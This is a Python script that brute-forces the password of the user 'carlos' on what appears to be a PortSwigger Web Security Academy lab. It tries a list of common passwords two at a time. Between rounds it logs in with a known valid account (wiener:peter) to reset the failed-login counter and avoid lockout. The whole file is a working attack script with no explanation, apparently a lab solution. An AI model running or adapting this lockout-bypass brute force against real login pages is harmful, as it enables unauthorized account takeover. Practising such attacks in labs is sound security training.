import requests
import time

# 💻 URLs
base_url = "https://0a2100ed04e5b33482de4889006300b5.web-security-academy.net"
login_url = f"{base_url}/login"
logout_url = f"{base_url}/logout"

# 👤 Credentials
target_user = "carlos"
valid_user = "wiener"
valid_pass = "peter"

# 🔐 Password list
passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",
    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",
    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow"
]

# 🧪 Session handling
session = requests.Session()

def login(username, password):
    payload = f"username={username}&password={password}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    return session.post(login_url, headers=headers, data=payload, allow_redirects=False)

def logout():
    session.get(logout_url)

# 🚀 Brute-force loop (2 passwords per cycle)
for i in range(0, len(passwords), 2):
    for pwd in passwords[i:i+2]:
        res = login(target_user, pwd)
        print(f"[TRY] carlos:{pwd} => Status {res.status_code}, Length {len(res.text)}")
        if res.status_code == 302 or "Log out" in res.text:
            print(f"\n🎉 Success! Password found for carlos: {pwd}")
            exit()

    # 💡 Cooldown
    print("\n[COOLDOWN] Logging in with valid creds to reset session...")
    login(valid_user, valid_pass)
    logout()
    time.sleep(2)
